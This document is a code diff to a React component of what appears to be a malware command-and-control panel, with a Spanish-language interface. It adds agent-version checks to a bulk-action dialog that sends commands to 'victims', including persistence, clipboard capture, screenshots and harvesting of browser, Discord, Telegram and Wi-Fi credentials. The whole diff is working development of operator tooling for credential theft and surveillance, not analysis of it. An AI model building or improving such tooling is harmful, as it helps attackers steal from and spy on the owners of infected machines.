@@ -6,7 +6,7 @@ import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { mutate, useApi } from '@/hooks/useApi';
 import { ApiError } from '@/lib/api';
-import { ACTION_MAP, actionDetail, type ActionDef } from '@/lib/actions';
+import { ACTION_MAP, actionDetail, versionAtLeast, type ActionDef } from '@/lib/actions';
 import type { Task, Victim } from '@/lib/types';
 
 const BULK_IDS = ['persist-on', 'persist-off', 'harvest', 'harvest-browsers', 'harvest-discord', 'harvest-telegram', 'harvest-wifi', 'harvest-productkey', 'screenshot', 'update', 'scan', 'clip-start', 'clip-stop', 'watch-on', 'watch-off', 'cancel-all'];
@@ -61,6 +61,10 @@ export function BulkDialog({
   const [outcomes, setOutcomes] = useState<Outcome[]>([]);
   const action: ActionDef | undefined = ACTION_MAP.get(id);
   const activeTasks = useApi<{ items: Task[] }>(open && id === 'cancel-all' ? '/tasks?status=running&limit=200' : null);
+  const available = BULK_IDS.filter((value) => {
+    const minimum = ACTION_MAP.get(value)?.minAgent;
+    return !minimum || (victims.length > 0 && victims.every((victim) => versionAtLeast(victim.agentVersion, minimum)));
+  });
 
   useEffect(() => { if (open) setOutcomes([]); }, [open, id]);
 
@@ -106,7 +110,7 @@ export function BulkDialog({
           <div>
             <label className="mb-1 block text-2xs uppercase tracking-wide text-muted">Acción</label>
             <select value={id} onChange={(event) => setId(event.target.value)} className="h-8 w-full rounded border border-line bg-bg px-2 text-xs">
-              {BULK_IDS.map((value) => <option key={value} value={value}>{ACTION_MAP.get(value)?.label ?? value}</option>)}
+              {available.map((value) => <option key={value} value={value}>{ACTION_MAP.get(value)?.label ?? value}</option>)}
             </select>
             {action ? <p className="mt-1 font-mono text-2xs text-muted">{action.detail ? (typeof action.detail === 'string' ? action.detail : action.detail(victims[0]!)) : 'cancelar tareas activas'}</p> : null}
           </div>
